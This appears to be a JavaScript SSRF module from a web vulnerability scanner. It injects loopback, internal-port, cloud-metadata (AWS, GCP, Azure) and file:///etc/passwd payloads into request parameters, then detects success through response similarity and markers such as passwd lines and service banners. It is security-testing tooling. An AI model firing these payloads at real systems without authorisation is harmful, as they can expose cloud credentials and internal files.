// server side request forgry with similarity detection

import { Attack, Mutator } from './attack.js';
import { Request } from '../http/request.js';

export default class ModSsrf extends Attack {
    constructor(crawler, persister, options, crawlerConfig) {
        super(crawler, persister, options, crawlerConfig);
        this.moduleName = 'ssrf';
    }

    async attack(request) {
        const payloads = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'http://127.0.0.1:22/',
            'http://127.0.0.1:3306/',
            'http://127.0.0.1:3000/', // internal web application port
            'http://127.0.0.1:8080/',
            'http://169.254.169.254/latest/meta-data/',  // aws metadata
            'http://metadata.google.internal/',           // gcp metadata
            'http://169.254.169.254/metadata/instance',   // azure metadata
            'http://127.0.0.1:6379/',                     // redis default port
            'file:///etc/passwd',
            'file:///etc/hostname',
        ];

        const mutator = new Mutator(payloads, this.options.skippedParams || []);

        // get normal respnse first for baseline comparison
        let normalResponse;
        try {
            normalResponse = await this.crawler.send(request);
        } catch {
            return;
        }
        if (!normalResponse || !normalResponse.content) return;

        const baseContent = normalResponse.content;

        for (const mutation of mutator.mutate(request)) {
            if (this._isTimeUp()) break;

            try {
                const response = await this.crawler.send(mutation.request);
                if (!response || !response.content) continue;

                // 1. Check for specific success markers (High Confidence)
                if (this._hasExplicitSSRFMarker(response.content)) {
                    this.logVulnerability(
                        'Server Side Request Forgery',
                        mutation.request,
                        `SSRF confirmed via explicit marker in parameter ${mutation.parameter}`,
                        mutation.parameter,
                        'WSTG-INPV-19'
                    );
                    break;
                }

                // 2. Check for significant response change (Similarity Analysis)
                // If the response is significantly different from the baseline, it may indicate SSRF
                if (!this.isResponseSimilar(baseContent, response.content, 0.15)) { // 15% threshold for SSRF

                    // FALSE POSITIVE MITIGATION:
                    // 1. Ignore if the response is a redirect (likely Open Redirect, not SSRF)
                    if (response.isRedirect) continue;

                    // 2. Ignore if the status code differs from baseline but is also an error
                    // (prevents noise from different error pages)
                    if (response.status >= 400 && normalResponse.status >= 400) continue;

                    // 3. Double-Check Heuristic for Anomaly (Reflection/Error Page Mitigation)
                    // If we suspect SSRF based on a length/similarity difference, verify it's not just reflection.
                    // We send a guaranteed invalid domain padded to the exact same length as the payload.
                    let invalidPayload = 'http://a.invalid/';
                    if (mutation.payload.length > invalidPayload.length) {
                        invalidPayload += 'a'.repeat(mutation.payload.length - invalidPayload.length);
                    } else if (mutation.payload.length < invalidPayload.length) {
                        invalidPayload = 'http://x.y/'.padEnd(mutation.payload.length, 'a');
                    }

                    let verifyRequest = null;
                    if (mutation.parameter.startsWith('PATH_')) {
                        const idx = parseInt(mutation.parameter.replace('PATH_', ''));
                        const parts = request._basePath.split('/');
                        parts[idx] = invalidPayload;
                        let targetUrl = parts.join('/');
                        if (request.scheme && request.netloc) targetUrl = `${request.scheme}://${request.netloc}${targetUrl}`;
                        verifyRequest = new Request(targetUrl, {
                            method: request.method, getParams: request.getParams, postParams: request.postParams,
                            referer: request.referer, linkDepth: request.linkDepth, enctype: request.enctype
                        });
                    } else {
                        const mutatedGet = request.getParams.map(p => [...p]);
                        const mutatedPost = typeof request.postParams !== 'string' ? (request.postParams || []).map(p => [...p]) : request.postParams;

                        let found = false;
                        for (let i = 0; i < mutatedGet.length; i++) {
                            if (mutatedGet[i][0] === mutation.parameter) { mutatedGet[i][1] = invalidPayload; found = true; break; }
                        }
                        if (!found && typeof mutatedPost !== 'string') {
                            for (let i = 0; i < mutatedPost.length; i++) {
                                if (mutatedPost[i][0] === mutation.parameter) { mutatedPost[i][1] = invalidPayload; break; }
                            }
                        }
                        verifyRequest = new Request(request.path, {
                            method: request.method, getParams: mutatedGet, postParams: mutatedPost,
                            referer: request.referer, linkDepth: request.linkDepth, enctype: request.enctype
                        });
                    }
                    verifyRequest.pathId = request.pathId;

                    try {
                        const verifyResponse = await this.crawler.send(verifyRequest);
                        // If the response to the invalid domain is highly similar to the suspected SSRF response,
                        // it means the server is just reflecting the input or throwing a generic error 
                        // based on input length/format, NOT actually fetching the URL.
                        if (verifyResponse && verifyResponse.content &&
                            this.isResponseSimilar(response.content, verifyResponse.content, 0.05)) {
                            continue; // It's a false positive
                        }
                    } catch {
                        // Proceed to log if verification request fails entirely
                    }

                    this.logVulnerability(
                        'Server Side Request Forgery',
                        mutation.request,
                        `Potential SSRF found via response anomaly in parameter ${mutation.parameter}`,
                        mutation.parameter,
                        'WSTG-INPV-19'
                    );
                    break;
                }
            } catch {
                // skip errors
            }
        }
    }

    // check for unambiguous indicators of successful SSRF
    _hasExplicitSSRFMarker(content) {
        const markers = [
            'ami-id', 'instance-id', 'local-hostname', // AWS
            'computeMetadata/v1',                      // GCP
            'SSH-2.0-',                                // SSH banner
            'root:x:0:0:', 'root:*:0:0:',              // Unix passwd
            '+PONG', '$6\r\nSELECT',                  // Redis
            'mysql_native_password',                   // MySQL
            '[boot loader]',                           // Windows win.ini
        ];

        for (const marker of markers) {
            if (content.includes(marker)) return true;
        }

        return false;
    }
}
